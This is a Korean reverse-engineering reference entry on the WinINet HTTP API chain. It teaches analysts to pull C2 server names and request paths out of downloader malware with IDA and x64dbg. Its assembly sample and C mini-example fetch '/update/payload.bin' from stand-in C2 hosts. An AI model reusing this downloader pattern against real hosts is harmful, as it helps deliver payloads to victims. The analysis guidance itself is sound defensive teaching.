---
id: REV-0514
title: "WinAPI 네트워킹 함수 사전: InternetOpen 계열(WinINet 기초)"
slug: "rev-0514-internetopen-family"
category: "windows-pe"
difficulty: "basic"
platform: [windows]
architecture: [x86, x64]
format: [PE]
tools: [IDA, x64dbg]
keywords: ["InternetOpen", "InternetConnect", "HttpOpenRequest", "HttpSendRequest", "InternetReadFile", "wininet.dll", "WinINet"]
aliases: ["인터넷오픈", "위닛", "wininet 다운로더", "HTTP 다운로더 API"]
symptom_keywords: ["wininet.dll을 임포트하는데 뭘 하는지 모르겠다", "InternetOpen이 뭔지 모르겠다", "HttpSendRequest로 뭘 보내는지 확인하고 싶다", "다운로더 악성코드의 URL을 찾고 있다", "User-Agent 문자열이 왜 있는지 궁금하다"]
source_ids: ["SRC-MS-PE-FORMAT", "SRC-GENERAL-REVERSING"]
last_verified: "2026-09-08"
---

## 한 줄 요약
`InternetOpen`으로 시작해 `InternetConnect` → `HttpOpenRequest` → `HttpSendRequest` → `InternetReadFile`로 이어지는 WinINet API 체인은 저수준 소켓(REV-0512/0513) 대신 HTTP(S) 프로토콜을 사용해 파일을 다운로드하거나 서버와 통신하는 코드에서 나타나며, `wininet.dll`이라는 Import 자체가 "이 프로그램은 HTTP 기반으로 외부와 통신한다"는 강한 신호이므로 각 단계 인자에서 URL/서버 주소를 뽑아내는 것이 분석의 핵심이다.

## 언제 검색해야 하나
- Import 목록에서 `wininet.dll`을 발견하고 이 프로그램이 무엇을 다운로드하거나 어디로 데이터를 보내는지 확인해야 할 때
- `InternetConnect`/`HttpOpenRequest`의 인자에서 서버 이름과 요청 경로(URL)를 추출해야 할 때
- 다운로더형 악성코드나 CTF 문제에서 "이 프로그램이 접속하는 주소가 무엇인가"를 알아내야 할 때
- 저수준 소켓 API(`socket`/`connect`)가 안 보이는데도 네트워크 관련 문자열(`http://`, `User-Agent` 등)이 보여서 어떤 API 계열을 쓰는지 확인해야 할 때

## 핵심 개념

### 호출 순서와 각 함수의 역할
```c
HINTERNET InternetOpenA(
    LPCSTR lpszAgent,       // 1. User-Agent 문자열(임의로 지정 가능)
    DWORD  dwAccessType,    // 2. INTERNET_OPEN_TYPE_DIRECT(1) 또는 PRECONFIG(0, IE 설정 사용)
    LPCSTR lpszProxyName,   // 3. 프록시 서버(대개 NULL)
    LPCSTR lpszProxyBypass, // 4. 프록시 예외(대개 NULL)
    DWORD  dwFlags          // 5. 대개 0
);

HINTERNET InternetConnectA(
    HINTERNET hInternet,       // 1. InternetOpen이 반환한 세션 핸들
    LPCSTR    lpszServerName,  // 2. 접속할 서버 도메인/IP — 여기서 C2/다운로드 서버가 바로 드러남
    INTERNET_PORT nServerPort, // 3. 포트(INTERNET_DEFAULT_HTTP_PORT=80, HTTPS_PORT=443)
    LPCSTR    lpszUsername,    // 4. 대개 NULL
    LPCSTR    lpszPassword,    // 5. 대개 NULL
    DWORD     dwService,       // 6. INTERNET_SERVICE_HTTP(3)
    DWORD     dwFlags,         // 7. INTERNET_FLAG_SECURE(0x800000, HTTPS)
    DWORD_PTR dwContext        // 8. 대개 0
);

HINTERNET HttpOpenRequestA(
    HINTERNET hConnect,      // 1. InternetConnect가 반환한 연결 핸들
    LPCSTR    lpszVerb,      // 2. "GET"/"POST" 등
    LPCSTR    lpszObjectName,// 3. 요청 경로 — "/payload.bin" 같은 URL의 뒷부분
    LPCSTR    lpszVersion,   // 4. 대개 NULL(HTTP/1.1)
    LPCSTR    lpszReferrer,  // 5. 대개 NULL
    LPCSTR    *lplpszAcceptTypes,
    DWORD     dwFlags,
    DWORD_PTR dwContext
);

BOOL HttpSendRequestA(
    HINTERNET hRequest,      // 1. HttpOpenRequest가 반환한 요청 핸들
    LPCSTR    lpszHeaders,   // 2. 추가 헤더(대개 NULL)
    DWORD     dwHeadersLength,
    LPVOID    lpOptional,    // POST 본문 데이터
    DWORD     dwOptionalLength
);

BOOL InternetReadFile(
    HINTERNET hFile,                     // 1. 요청 핸들
    LPVOID    lpBuffer,                  // 2. 응답 본문이 채워질 버퍼
    DWORD     dwNumberOfBytesToRead,     // 3. 읽을 최대 바이트 수
    LPDWORD   lpdwNumberOfBytesRead      // 4. 실제로 읽은 바이트 수
);
```
이 다섯 함수가 순서대로(핸들이 이전 함수의 반환값을 이어받으며) 등장하는 패턴이 표준적인 "HTTP GET으로 뭔가를 받아오는" 코드다.

### 서버 주소를 재구성하는 법
전체 URL은 코드 어디에도 문자열 하나로 존재하지 않는 경우가 많다 — `InternetConnect`의 `lpszServerName`(도메인)과 `HttpOpenRequest`의 `lpszObjectName`(경로)이 서로 다른 함수 호출에 나뉘어 있으므로, 두 값을 각각 확인해 `https://{lpszServerName}:{nServerPort}{lpszObjectName}` 형태로 직접 조합해야 한다.

### WinHTTP와의 차이
비슷한 역할을 하는 `WinHttpOpen`(winhttp.dll) 계열도 있다. WinINet은 사용자 IE 프록시 설정에 의존하는 데스크톱 애플리케이션용이고, WinHTTP는 서비스/백그라운드 프로세스에서 더 흔히 쓰인다는 차이가 있지만, 리버싱 관점에서는 함수 이름과 인자 구조가 매우 유사하므로 이 문서의 분석 방식을 거의 그대로 적용할 수 있다.

## 화면/코드에서 보이는 징후
```asm
push 0
push 0
push 0
push 1                       ; INTERNET_OPEN_TYPE_DIRECT
push offset agentStr         ; "Mozilla/5.0 ..."
call InternetOpenA
...
push 800000h                 ; INTERNET_FLAG_SECURE
push 3                       ; INTERNET_SERVICE_HTTP
push 0
push 0
push 1BBh                    ; 443
push offset serverName       ; "malicious-c2.example"
push [hInternet]
call InternetConnectA
...
push offset objName          ; "/update/payload.bin"
push offset verbGet          ; "GET"
push [hConnect]
call HttpOpenRequestA
```
- `InternetOpenA`의 첫 인자로 흔한 브라우저 User-Agent 문자열이 그대로 하드코딩되어 있는 경우가 많다(정상 트래픽처럼 위장하려는 목적).
- `InternetConnectA`의 두 번째 인자(서버 도메인)가 Strings 창에 그대로 노출되는 경우가 흔하다.

## 가장 먼저 할 것
Strings 창(`Shift+F12`)에서 도메인처럼 보이는 문자열이나 `"GET"`/`"POST"`/`"http"` 같은 키워드를 먼저 훑고, `InternetConnectA`/`HttpOpenRequestA`의 xref를 따라가 실제로 어떤 인자가 들어가는지 대조한다.

## 단계별 절차
**1) Import에서 체인 확인**
`wininet.dll`에서 `InternetOpenA/W`, `InternetConnectA/W`, `HttpOpenRequestA/W`, `HttpSendRequestA/W`, `InternetReadFile`이 모두 있는지 확인한다.

**2) 각 핸들의 인자 추적(IDA)**
`X`(xref)로 각 함수 호출 지점을 찾아 `lpszServerName`, `nServerPort`, `lpszObjectName`을 순서대로 기록한다.

**3) x64dbg로 동적 확인**
```text
bp InternetConnectA
run
; x64: RDX = lpszServerName — Follow in Dump로 도메인 문자열 확인
bp HttpOpenRequestA
run
; x64: R8 = lpszObjectName — Follow in Dump로 경로 확인
```
**4) 응답 데이터 확인**
`InternetReadFile` 호출 이후(`Ctrl+F9`) `lpBuffer`를 확인하면 실제로 다운로드된 데이터(추가 페이로드, 설정 등)를 볼 수 있다.

## 명령어/단축키
- x64dbg: `bp InternetOpenA`, `bp InternetConnectA`, `bp HttpOpenRequestA`, `bp HttpSendRequestA`, `bp InternetReadFile`
- x64dbg: 문자열 인자 주소 우클릭 → `Follow in Dump`, Dump 창 우클릭 → `Text` 표시 전환
- IDA: `Shift+F12`(Strings), `X`(xref)

## 출력 해석
- 각 `HINTERNET` 반환값이 `NULL`이면 그 단계에서 실패한 것이며, `GetLastError()`로 원인(DNS 실패, 프록시 문제 등)을 확인한다.
- `HttpSendRequestA`가 `TRUE`를 반환했다면 요청은 전송된 것이고, 실제 응답 코드(200, 404 등)는 별도로 `HttpQueryInfo`를 호출해야 확인할 수 있다(이 문서에서 다루지 않은 별도 API).
- `InternetReadFile`이 `lpdwNumberOfBytesRead`에 `0`을 채우면 더 이상 받을 데이터가 없다는(다운로드 완료) 뜻이다.

## 흔한 실수
- 전체 URL이 문자열 하나로 어딘가에 존재할 것이라 가정하고 Strings 창만 뒤지는 것 — 서버명과 경로가 서로 다른 함수 인자로 나뉘어 있어 두 곳을 모두 확인해야 한다.
- `A`(ANSI) 버전과 `W`(유니코드) 버전 함수 이름이 다르다는 것을 놓치고 Import 목록에서 한쪽만 검색하는 것 — 두 버전 모두 확인해야 한다.
- `wininet.dll`이 있다고 해서 반드시 파일 다운로드 목적이라 단정하는 것 — 단순 버전 체크, 라이선스 서버 통신 등 정상적인 목적도 흔하다.

## 막혔을 때 다음 체크
- 저수준 소켓 기반 통신과 비교하고 싶다면 → REV-0512 WinAPI 네트워킹 함수 사전: WSAStartup socket connect
- 다운로드한 데이터를 디스크에 저장하는 흐름까지 보고 싶다면 → REV-0139 CreateFile ReadFile WriteFile 입력 데이터 추적
- 받은 데이터가 암호화되어 있다면 → REV-0140 Crypt API BCrypt API 흔적 찾기

## 미니 예제
```c
HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
HINTERNET hConn = InternetConnectA(hInet, "example-c2.net", 443, NULL, NULL, INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 0);
HINTERNET hReq  = HttpOpenRequestA(hConn, "GET", "/update/payload.bin", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
HttpSendRequestA(hReq, NULL, 0, NULL, 0);
char buf[4096]; DWORD read;
InternetReadFile(hReq, buf, sizeof(buf), &read);
```
위 코드에서 실제 접속 대상은 `https://example-c2.net:443/update/payload.bin`이며, `InternetConnectA`와 `HttpOpenRequestA` 각각의 두/세 번째 인자를 조합해야 이 전체 URL이 재구성된다.

## 관련 글
- REV-0512 — WinAPI 네트워킹 함수 사전: WSAStartup socket connect
- REV-0139 — CreateFile ReadFile WriteFile 입력 데이터 추적
- REV-0140 — Crypt API BCrypt API 흔적 찾기

## 출처/검증
- `InternetOpen`/`InternetConnect`/`HttpOpenRequest`/`HttpSendRequest`/`InternetReadFile`의 시그니처와 플래그 상수는 Microsoft 공식 문서(learn.microsoft.com, "WinINet functions") 기준이다(2026-09-08 확인).
- WinINet과 WinHTTP의 용도 차이는 Microsoft 공식 문서("Choosing an HTTP API")의 일반적인 안내 기준이며, 다운로더형 악성코드의 URL 재구성 기법은 통상적인 분석 관례 레퍼런스 기준이다.
